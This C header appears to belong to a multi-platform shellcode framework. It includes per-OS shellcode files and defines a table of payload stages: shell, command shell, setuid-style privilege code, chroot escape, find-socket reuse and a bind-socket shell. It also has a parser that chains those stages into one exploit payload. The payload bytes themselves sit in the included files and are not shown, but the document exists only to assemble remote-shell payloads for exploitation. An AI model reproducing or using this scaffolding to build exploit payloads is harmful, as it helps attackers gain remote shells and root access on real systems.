#ifndef ASMCODES_H
#define ASMCODES_H

#include "mips-irix"
#include "sparc-solaris"
#include "parisc-hpux"
#include "powerpc-aix"
#include "alpha-ultrix"
#include "x86-beos"
#include "x86-bsd"
#include "x86-linux"
#include "x86-solaris"
#include "x86-sco"

typedef struct{char *n;char *c;}asmcodes_t[9];

asmcodes_t asmcodes={
#if defined(AIX) || ( defined(X86) && ( defined(SOLARIS) || defined(SCO) ) )
    { "syscallcode",   syscallcode  },
#else
    { "",              NULL          },
#endif
    { "shellcode",     shellcode     },
    { "cmdshellcode",  cmdshellcode  },
#if !defined(BEOS) && !defined(ULTRIX)
#if defined(SOLARIS) || defined(SCO) || defined(LINUX) || defined(BSD)
    { "setuidcode",    setuidcode    },
#endif
#if defined(HPUX)
    { "setresuidcode", setresuidcode },
#endif
#if defined(IRIX) || defined(AIX)
    { "setreuidcode",  setreuidcode  },
#endif
    { "chrootcode",    chrootcode    },
#if !defined(OPENSERVER)
    { "findsckcode",   findsckcode   },
#else
    { "",              NULL          },
#endif
#if !defined(SCO)
    { "bindsckcode",   bindsckcode   }
#else
    { "",              NULL          },
#endif
#else
    { "",              NULL          },
    { "",              NULL          },
    { "",              NULL          },
    { "",              NULL          }
#endif
};

#if defined(BEOS) || defined(ULTRIX)
#define FINDSCKPORTOFS    -1
#define BINDSCKPORTOFS    -1
#define usleep(a) sleep(1)
#endif

#define is(flag)    (flags&(1<<flag))
#define block(flag) (flags&(1<<flag))
#define code(flag)  asmcodes[flag].c

#define SYSCALL 0
#define SHELL   1
#define CMD     2
#define CRED    3 
#define CHROOT  4 
#define FIND    5 
#define BIND    6 

#define _REMOTE 9 

typedef struct{char state;char *follow;int flag;}pblock_t[4];

pblock_t tab={
    { 'P', "CSRFB", (1<<CRED)              },
    { 'R', "CSFB" , (1<<CHROOT)            },
    { 'F', "CS"   , (1<<FIND)|(1<<_REMOTE) },
    { 'B', "CS"   , (1<<BIND)|(1<<_REMOTE) }
};

int parseblocks(char *b){
    char c,s;int i,flag=0;s=(strlen(b)==1);
    while((c=*b++)&&*b){
        for(i=0;i<4;i++) if(c==tab[i].state) break;
        if(i==4) return(-1);
        if(strchr(tab[i].follow,*b)) flag|=tab[i].flag; else return(-1);
    }
    if(c=='S') flag|=(1<<SHELL);
    else if(c=='C') flag|=(1<<CMD); else return(-1);
    return(flag);
}

#endif
